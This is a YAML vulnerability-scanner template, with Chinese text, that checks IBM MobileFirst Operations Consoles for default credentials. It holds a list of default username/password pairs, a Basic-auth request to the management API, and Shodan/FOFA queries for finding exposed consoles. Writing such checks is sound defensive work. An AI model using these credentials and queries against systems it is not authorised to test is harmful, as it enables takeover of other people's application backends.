id: ibm-mobilefirst-foundation-ops-default-credentials

info:
  name: IBM MobileFirst Foundation 操作控制台默认凭据漏洞
  author: Vishal Vishwakarma
  severity: critical
  description: |
    检测到 IBM MobileFirst Foundation Operations Console 存在默认凭据可登录的问题。该管理 REST API 可完全控制移动应用后端，包括适配器管理（adapter management）、推送通知基础设施（push notification infrastructure）、OAuth 安全配置（OAuth security configuration）以及应用真实性强制（application authenticity enforcement）。
  reference:
    - https://www.ibm.com/docs/en/mfp/8.0?topic=console-mobilefirst-operations
    - https://mobilefirstplatform.ibmcloud.com/tutorials/en/foundation/8.0/installation-configuration/production/server-configuration/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
  metadata:
    max-request: 4
    verified: true
    vendor: ibm
    product: mobilefirst-foundation
    shodan-query: http.title:"MobileFirst Operations Console"
    fofa-query: title="MobileFirst Operations Console"
  tags: IBM-MobileFirst-Foundation
  remediation: >-
    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。

http:
  - raw:
      - |
        GET /mfpadmin/management-apis/2.0/runtimes HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Accept: application/json
    payloads:
      username:
        - admin
        - demo
        - appcenteradmin
        - root
      password:
        - admin
        - demo
        - admin
        - passw0rd
    attack: pitchfork
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "productVersion"
          - "synchronizationStatus"
          - "management-apis"
        condition: and
      - type: word
        part: header
        words:
          - "application/json"
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"productVersion"\s*:\s*"([^"]+)"'
